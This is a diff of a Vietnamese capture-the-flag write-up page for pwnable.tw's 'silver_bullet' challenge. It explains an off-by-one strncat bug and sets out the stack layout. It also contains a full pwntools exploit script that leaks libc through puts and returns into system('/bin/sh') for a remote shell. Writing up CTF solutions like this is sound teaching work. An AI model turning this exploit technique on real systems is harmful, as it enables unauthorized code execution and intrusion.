@@ -164,6 +164,20 @@
                 <div id="content" class="content">
                     <main>
                         <h1 id="silver_bullet"><a class="header" href="#silver_bullet">silver_bullet</a></h1>
+<h2 id="file"><a class="header" href="#file">file</a></h2>
+<pre><code class="language-shell">➜ silver_bullet ⚡                                                 20:52:52
+▶ file silver_bullet
+silver_bullet: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8c95d92edf8bf47b6c9c450e882b7142bf656a92, not stripped
+➜ silver_bullet ⚡                                                 21:12:59
+▶ checksec silver_bullet
+[*] '/mnt/d/pwn_myself/pwnable_tw/silver_bullet/silver_bullet'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+</code></pre>
 <h2 id="source"><a class="header" href="#source">source</a></h2>
 <pre><code class="language-c">// positive sp value has been detected, the output may be wrong!
 void __usercall __noreturn start(int a1@&lt;eax&gt;, void (*a2)(void)@&lt;edx&gt;)
@@ -315,6 +329,146 @@ int __cdecl beat(int bullet, int werewolf)
   }
   return result;
 }
+
+</code></pre>
+<pre><code class="language-shell">pwndbg&gt; stack 50
+00:0000│ esp 0xffa043e4 —▸ 0xffa043f4 ◂— 0x61616161 ('aaaa')
+01:0004│     0xffa043e8 —▸ 0xffa043ec ◂— 0x7fffffff
+02:0008│     0xffa043ec ◂— 0x7fffffff
+03:000c│     0xffa043f0 —▸ 0x8048d06 ◂— inc edi /* 'Gin' */
+04:0010│ eax 0xffa043f4 ◂— 0x61616161 ('aaaa')
+... ↓        11 skipped
+10:0040│     0xffa04424 ◂— 0x62626208
+11:0044│ ebp 0xffa04428 ◂— 'bbbb'
+12:0048│     0xffa0442c —▸ 0xf7d3b600 (__libc_start_main+192) ◂— add byte ptr [eax], 0
+
+
+</code></pre>
+<h2 id="analysis"><a class="header" href="#analysis">Analysis</a></h2>
+<p>Mấy nay mình giải bài cứ bị không tìm ra bug, cứ bị ngáo ngơ í ==&quot;</p>
+<ul>
+<li>Bài này có 1 bug ở hàm <strong>strncat</strong>, chuỗi bullet có length là 0x30 tức 48bytes, ta có thể nhập trc 0x2f tức 47bytes, sau đó nhập tiếp 0x1 tức 1 byte nữa, khi nó nối chuỗi thì hiển nhiên byte null sẽ ghi đè lên stack tiếp theo, này là lỗi <em><strong>Off by one</strong></em>. Lúc này bullet power tức length của bullet đang là 0x2f thành 0x00 do bị ghi đè, xong lúc update thì 0+1=1 =&gt; nhỏ hơn 47 =&gt; vẫn cho phép nhập bullet tiếp dẫn đến có thể ghi đè sau đó. </li>
+</ul>
+<p>Dưới đây là stack frame dựa theo IDA để vẽ:</p>
+<div class="table-wrapper"><table><thead><tr><th>stak</th><th></th></tr></thead><tbody>
+<tr><td>ebp+0x8</td><td></td></tr>
+<tr><td>ebp+0x4</td><td>ret</td></tr>
+<tr><td>ebp</td><td>old ebp</td></tr>
+<tr><td>ebp-0x4</td><td>power bullet length</td></tr>
+<tr><td>ebp-0x8</td><td>bullet string</td></tr>
+<tr><td>...</td><td>bullet string</td></tr>
+<tr><td>...</td><td>bullet string</td></tr>
+<tr><td>...</td><td>bullet string</td></tr>
+<tr><td>ebp-0x34</td><td>bullet string</td></tr>
+<tr><td>ebp-0x38</td><td>werewolf Name</td></tr>
+<tr><td>ebp-0x3C</td><td>werewolf HP</td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>Note</p>
+<blockquote>
+<p>Bình thường ở kiến trúc 32bit, trước khi call hàm nó sẽ :</p>
+</blockquote>
+<blockquote>
+<p>Push tham số lên stack</p>
+</blockquote>
+<blockquote>
+<p>Tới call function thì sẽ push return address vào</p>
+</blockquote>
+<blockquote>
+<p>xong mới nhảy tới call</p>
+</blockquote>
+</blockquote>
+<p>Thì ta chỉ cần thiết kế stack như vậy là được tức là:</p>
+<div class="table-wrapper"><table><thead><tr><th>stack</th><th></th></tr></thead><tbody>
+<tr><td>ebp + 0xC</td><td>arg1 of puts</td></tr>
+<tr><td>ebp+0x8</td><td>ret of puts =&gt; main</td></tr>
+<tr><td>ebp+0x4</td><td>ret of main =&gt; puts</td></tr>
+<tr><td>ebp</td><td>old ebp</td></tr>
+</tbody></table>
+</div>
+<p>Sau khi mà leak được libc bằng cách gọi Puts với arg là puts got thì sẽ call lại main reload stack fram sau đấy sẽ tiếp tục như trước thay vì call puts thì call system thoi.</p>
+<h2 id="exploit"><a class="header" href="#exploit">exploit</a></h2>
+<h3 id="version-cùi-mía"><a class="header" href="#version-cùi-mía">version cùi mía</a></h3>
+<pre><code class="language-python">from pwn import *
+
+
+binary = ELF(&quot;./silver_bullet_patched&quot;)
+libc = ELF(&quot;./libc_32.so.6&quot;)
+
+context.binary = binary
+
+
+if args.REMOTE:
+    r = remote(&quot;chall.pwnable.tw&quot;, 10103)
+else:
+    r = process(binary.path)
+    #gdb.attach(r,api=True)
+
+payload = &quot;&quot;
+
+r.recv()
+r.sendline(&quot;1&quot;)
+r.recv()
+r.sendline(&quot;a&quot;*0x2f)
+r.recv()
+r.sendline(&quot;2&quot;)
+r.recv()
+r.sendline(&quot;a&quot;*0x1)
+r.recv()
+r.sendline(&quot;2&quot;)
+r.recv()
+
+
+log.info(&quot;Addr Puts func: &quot; + hex(binary.plt['puts']))
+log.info(&quot;Addr Puts func: &quot; + hex(binary.got['puts']))
+log.info(&quot;Addr Puts func: &quot; + hex(binary.sym['main']))
+
+payload = b&quot;b&quot;*7 + p32(binary.plt['puts']) + p32((binary.sym['main'])) + p32(binary.got['puts'])
+
+r.sendline(payload)
+r.recv()
+
+r.sendline(&quot;3&quot;)
+r.recv()
+r.sendline(&quot;3&quot;)
+print(r.recvuntil(b&quot;win !!\n&quot;))
+
+sleep(0.2)
+leak = r.recv(4)
+
+log.info(&quot;LEAK: &quot; + hex(u32(leak)))
+puts_offset = libc.symbols['puts']
+log.info(&quot;offset puts: &quot; + hex(puts_offset))
+libc.address = u32(leak) - puts_offset
+log.info(&quot;Libc base: &quot; + hex(libc.address))
+
+bin_sh = next(libc.search(b'/bin/sh\x00'))
+system = libc.symbols['system']
+
+
+r.sendline(&quot;1&quot;)
+r.recv()
+r.sendline(&quot;a&quot;*0x2f)
+r.recv()
+r.sendline(&quot;2&quot;)
+r.recv()
+r.sendline(&quot;a&quot;*0x1)
+r.recv()
+r.sendline(&quot;2&quot;)
+r.recv()
+
+payload = b&quot;b&quot;*7 + p32(system) + p32((binary.sym['main'])) + p32(bin_sh)
+
+r.sendline(payload)
+
+r.recv()
+r.sendline(&quot;3&quot;)
+r.recv()
+r.sendline(&quot;3&quot;)
+r.recv()
+
+r.interactive()
 
 </code></pre>
 
